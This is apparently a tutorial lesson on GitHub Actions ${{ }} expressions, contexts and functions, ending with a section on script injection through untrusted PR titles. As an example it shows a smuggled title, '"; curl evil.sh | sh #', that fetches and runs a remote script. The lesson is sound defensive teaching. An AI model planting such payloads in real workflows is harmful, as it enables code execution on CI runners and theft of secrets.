# Contexts and Expression Syntax

Every previous lesson in this phase has used `${{ }}` here and there — `${{ secrets.PROD_DEPLOY_TOKEN }}`, `${{ steps.build.outputs.id }}` — without stopping to explain what that syntax actually is. It is GitHub Actions' own expression language, with its own readable data sources (**contexts**) and its own small set of built-in functions, evaluated by GitHub Actions itself — completely independent of, and before, whatever shell or runtime a step eventually hands its resolved text to. That timing detail has real security consequences, covered at the end of this lesson.

## 1. The `${{ }}` Expression Syntax

`${{ expression }}` is usable almost anywhere a workflow file accepts a value — `env:`, `if:`, `with:`, `run:` strings, job/step names, and more. It is evaluated by the Actions runtime that orchestrates the workflow, not by the operating system shell that eventually runs a step's commands.

```yaml
- name: Report the triggering event
  run: echo "Triggered by ${{ github.event_name }} on ref ${{ github.ref }}"

- name: Decide if this is the main branch
  if: startsWith(github.ref, 'refs/heads/main')
  run: echo "This is a main-branch run"
```

## 2. Built-In Contexts

A context is a structured object exposing data the expression engine can read.

| Context | Exposes |
|---|---|
| `github` | Event payload, ref, sha, actor, event name, and more |
| `env` | Environment variables in scope at that point |
| `secrets` | Encrypted values, resolved and masked (Lesson 2) |
| `steps` | Outputs and outcome of previous steps in the same job, keyed by step `id` |
| `needs` | Outputs of upstream jobs, keyed by job id |
| `job` | Status info about the current job |
| `runner` | OS, temp directory, and other facts about the current runner |
| `matrix` | The current permutation, when a job uses a build matrix |

## 3. Common Expression Functions

| Function | Purpose |
|---|---|
| `contains(haystack, needle)` | Checks membership, e.g. in a list of labels or a string |
| `startsWith(str, prefix)` / `endsWith(str, suffix)` | Checks string prefix/suffix — commonly used on `github.ref` |
| `format(pattern, values...)` | Builds a string with `{0}`, `{1}`-style placeholders |
| `toJSON(value)` | Serializes any context value to a JSON string, most often for debugging |

```yaml
- name: Build a dynamic tag string
  env:
    COMPUTED_TAG: ${{ format('build-{0}-{1}', github.run_number, github.sha) }}
  run: echo "Computed tag is $COMPUTED_TAG"

- name: Dump the full event payload for debugging
  run: echo '${{ toJSON(github.event) }}'
```

`${{ github.event }}` alone does not produce readable text — YAML string substitution needs a real string, not a nested object. `toJSON()` bridges that gap.

## 4. Why Expressions Are Substituted Before the Shell Runs (and the Injection Risk)

Evaluation happens before a step's process starts, everywhere the expression appears. For `if:`, `env:`, and `with:`, this determines whether a step even runs or what value a field is set to — decided entirely by GitHub Actions, no shell involved. For `run:` specifically, evaluation means **textual substitution**: GitHub Actions resolves every `${{ }}` in a `run:` block to its literal value and produces a finished string; only that finished string, with no `${{ }}` remaining in it at all, is ever handed to the shell to interpret and execute. The shell has no concept of the expression that produced its input — it parses whatever text arrives exactly as if a human had typed it directly into a terminal.

```
${{ github.event.pull_request.title }}
        │  (GitHub Actions substitutes this BEFORE the shell starts)
        ▼
run: echo "PR title: "; curl evil.sh | sh #"
        │  (shell now parses the finished text — no idea an expression was ever there)
        ▼
Shell executes the injected command as if the workflow author had typed it
```

This is where untrusted expression values become a security concern. If a `run:` step interpolates `${{ github.event.pull_request.title }}` (or any value an external actor can freely set — a PR title, a commit message, an issue title) and that value contains shell metacharacters (backticks, `$( )`, quotes, `&&`, newlines), those characters are already substituted into the command text before the shell sees anything — the shell interprets them exactly as it would any other metacharacter, because it has no way to know they originated from attacker-controlled data rather than the workflow author's own script. The safe pattern is to pass the value through `env:` and reference it as `$VAR` in the shell:

```yaml
- name: Safe pattern
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}   # inert data, not spliced into command text
  run: |
    echo "PR title: $PR_TITLE"
```

Phase 11 (Security) covers this class of vulnerability in depth.

Validate the YAML is well-formed:

```bash
python3 -c "import yaml,sys; yaml.safe_load(sys.stdin.read())" < workflow.yml
```

## Comparison

| Comparison | Detail |
|---|---|
| `${{ }}` expressions vs. shell variable expansion | `${{ github.ref }}` is resolved by GitHub Actions before the shell starts; `$SOME_VAR` is resolved by the shell after the step's process has begun — bash syntax like `${VAR:-default}` means nothing to the expression language, and expression syntax means nothing to bash |
| Context lookup vs. function call | `github.ref` is a plain property lookup; `startsWith(github.ref, 'refs/heads/main')` is a function call taking context values as arguments — both are valid inside the same `${{ }}` and can be combined |
| Interpolating into `env:` vs. directly into `run:` text | Assigning to `env:` and reading via `$VAR` keeps the value as opaque shell data. Splicing directly into `run:` text makes it part of the command itself — safe for fully-controlled values (`github.sha`), risky for attacker-influenced ones (a PR title) |
| `toJSON()` vs. printing a raw context | A raw context object doesn't produce readable YAML-substituted text; `toJSON()` serializes it to a printable string |

## Common Mistakes

- **Trying to use bash-style variable expansion or defaulting syntax inside `${{ }}`** — e.g. `${{ env.FOO:-default }}`. The expression language has its own operators (`==`, `&&`, `||`, `!`, function calls) and no concept of bash parameter expansion; the two cannot be mixed.
- **Forgetting that `${{ }}` in `run:` is substituted as literal text before the shell ever sees it**, then being surprised that a value containing quotes, spaces, or shell metacharacters changes how the resulting command is parsed.
- **Interpolating attacker-influenced data (a PR title, an issue body, a commit message, a branch name) directly into a `run:` command** — a real, documented script-injection vector: a PR titled `"; curl evil.sh | sh #` becomes part of the literal shell command once substituted. The safe pattern is `env:` plus `$VAR`, never direct splicing. Phase 11 (Security) covers this in more depth.
- **Assuming every context is available in every part of the workflow** — `secrets` isn't populated for jobs not granted access to it, and `steps`/`needs` are only populated for steps/jobs that have already completed; referencing a not-yet-populated context typically evaluates to empty rather than raising an error.
- **Confusing a context property with a function** — writing `contains.github.ref` instead of `contains(a, b)`. Functions take parentheses and arguments; contexts use dot or bracket property access — the two are not interchangeable syntax.

## Hands-On Exercises

1. **(Requires a GitHub repo)** Build the Section 1 example, push it, and confirm the log line prints the actual event name and ref, with no `${{ }}` visible anywhere in the output.
2. **(Requires a GitHub repo)** Add the Section 3 `format()` and `toJSON()` steps, push, and confirm the computed tag string and the full event JSON both print correctly.
3. **(Requires a GitHub repo, PR trigger)** On a `pull_request` trigger, add a step `run: echo "PR title: ${{ github.event.pull_request.title }}"` directly (no `env:` indirection). Open a PR titled something containing a shell metacharacter, such as `test "; echo INJECTED #`, and observe the injected command executing in the log — then fix the step using the Section 4 safe pattern (`env:` + `$PR_TITLE`) and confirm the same title now prints as inert text with no injection.
4. **(Paper exercise)** A step writes `if: contains(github.event.pull_request.labels.*.name, 'deploy')`. A second, unrelated step in the same job references `steps.some_id.outputs.value` where `some_id` belongs to a step later in the job (not yet run). What does that reference evaluate to, and why?
5. **(Paper exercise)** Explain why `${{ env.FOO:-default }}` is invalid syntax, and rewrite the intended "use FOO or fall back to a default" logic using a valid expression or shell-side default instead.

## Interview Q&A

**Q: A workflow does `run: echo "PR title: ${{ github.event.pull_request.title }}"`. What's wrong with this, and how would you fix it?**
A: The PR title is attacker-controlled text, substituted verbatim into the shell command before the shell runs, so a maliciously crafted title can inject arbitrary shell syntax. Fix: pass the title through an `env:` variable and reference it in the shell as `$PR_TITLE`, treating it as inert data rather than command text.

**Q: Are `${{ }}` expressions evaluated by the shell?**
A: No — they're resolved entirely by GitHub Actions before the step's shell process even starts, which is exactly why the injection risk exists: the shell has no way to distinguish substituted attacker data from workflow-author-written script.

**Q: What's the difference between a context and a function in expression syntax?**
A: A context is a structured object read via property access (`github.ref`); a function takes arguments in parentheses and returns a computed value (`startsWith(github.ref, 'refs/tags/')`) — both can appear together inside the same `${{ }}`.

**Q: What happens if an expression references `steps.<id>.outputs` for a step that hasn't run yet?**
A: It typically evaluates to empty rather than raising an error, which can silently produce a blank value instead of an obvious failure.

**Q: Why does `toJSON(github.event)` matter for debugging?**
A: A raw context object doesn't substitute into YAML as readable text; `toJSON()` serializes it into a printable string so the whole payload can be inspected in a log.
